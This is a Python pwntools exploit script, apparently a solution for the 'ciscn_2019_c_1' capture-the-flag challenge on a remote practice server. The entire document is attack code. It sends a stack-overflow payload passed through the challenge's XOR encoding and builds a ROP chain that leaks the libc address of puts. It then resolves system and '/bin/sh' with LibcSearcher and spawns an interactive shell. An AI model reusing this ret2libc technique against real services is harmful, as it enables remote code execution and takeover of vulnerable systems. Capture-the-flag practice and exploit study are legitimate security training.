from pwn import *
from LibcSearcher import *


def encrypt(s):
    newstr = list(s)
    for i in range(len(newstr)):
        c = ord(s[i])
        if c <= 96 or c > 122:
            if c <= 64 or c > 90:
                if c > 47 and c <= 57:
                    c ^= 0xF
            else:
               c ^= 0xE
        else:
            c ^= 0xD
        newstr[i] = chr(c)
    return ''.join(newstr)

elf = ELF('./ciscn_2019_c_1')
#p = process('./ciscn_2019_c_1')
p = remote('node3.buuoj.cn',29497)

start = 0x400B28
rdi_addr = 0x400c83
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
p.sendlineafter("choice!",'1')

payload="a"*0x58
payload+=p64(rdi_addr)
payload+=p64(puts_got)
payload+=p64(puts_plt)
payload+=p64(start)
p.sendlineafter("encrypted",encrypt(payload))
p.recvuntil('Ciphertext\n')
p.recvuntil('\n')
puts_leak = u64(p.recvuntil('\n', drop=True).ljust(8,'\x00'))
log.success('puts_addr = ' + hex(puts_leak))
libc = LibcSearcher('puts', puts_leak)
libc_base = puts_leak - libc.dump('puts')
sys_addr = libc_base + libc.dump('system')
bin_sh_addr = libc_base + libc.dump('str_bin_sh')
payload1="a"*0x58
ret = 0x4006b9
payload1+=p64(ret)
payload1+=p64(rdi_addr)
payload1+=p64(bin_sh_addr)
payload1+=p64(sys_addr)
p.sendlineafter("choice!",'1')
p.sendlineafter("encrypted",payload1)
p.interactive()